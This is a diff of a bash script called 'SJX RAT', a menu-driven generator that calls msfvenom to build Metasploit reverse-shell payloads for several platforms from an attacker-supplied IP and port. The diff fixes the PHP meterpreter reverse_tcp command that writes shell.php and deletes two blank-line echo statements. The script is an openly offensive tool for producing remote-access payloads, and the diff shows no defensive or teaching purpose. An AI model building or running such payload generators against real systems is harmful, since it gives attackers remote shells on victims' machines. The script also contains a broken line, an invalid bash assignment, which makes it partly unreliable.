@@ -5,7 +5,6 @@ echo "=        SJX RAT         ="
 echo "=   fast creat payload   ="
 echo "=       metasploit       ="
 echo "=========================="
-echo "\n"
 echo "-----------------"
 echo "|  Menu Creater |"
 echo "|   [1] Linux   |"
@@ -19,7 +18,6 @@ echo "|   [8] Python  |"
 echo "|   [9] Bash    |"
 echo "|   [10] Perl   |"
 echo "-----------------"
-echo "\n"
 echo "Enter you choice:"
 read choice
 echo "Enter ip:"
@@ -45,7 +43,7 @@ case $choice in
         break
         ;;
     4)
-        msfvenom -p php/meterpreter_reverse_tcp LHOST=$ip LPORT=$port -f raw > $path/shell.php
+        msfvenom -p php/meterpreter/reverse_tcp LHOST=$ip LPORT=$port -f raw > $path/shell.php
         payload = "php/meterpreter_reverse_tcp"
         break
         ;;
